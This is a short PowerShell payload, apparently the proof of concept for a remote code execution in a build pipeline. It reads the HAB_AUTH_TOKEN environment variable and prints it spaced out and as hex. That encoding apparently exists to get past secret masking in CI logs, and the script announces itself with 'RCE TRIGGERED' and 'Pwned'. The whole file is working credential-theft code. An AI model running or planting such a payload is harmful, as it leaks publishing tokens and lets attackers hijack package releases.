Write-Host "WOLFIE RCE TRIGGERED! 🐺🩸"
Write-Host "Extracting HAB_AUTH_TOKEN..."
$Token = $env:HAB_AUTH_TOKEN
if ($Token) {
    $CharList = [char[]]$Token
    $SpacedToken = $CharList -join ' '
    Write-Host "Spaced Token: $SpacedToken"
    
    $TokenBytes = [System.Text.Encoding]::UTF8.GetBytes($Token)
    $HexToken = [System.BitConverter]::ToString($TokenBytes) -replace '-', ' '
    Write-Host "Hex Token: $HexToken"
} else {
    Write-Host "Token not found in environment."
}
Write-Host "Pwned by Niunia ecosystem!"
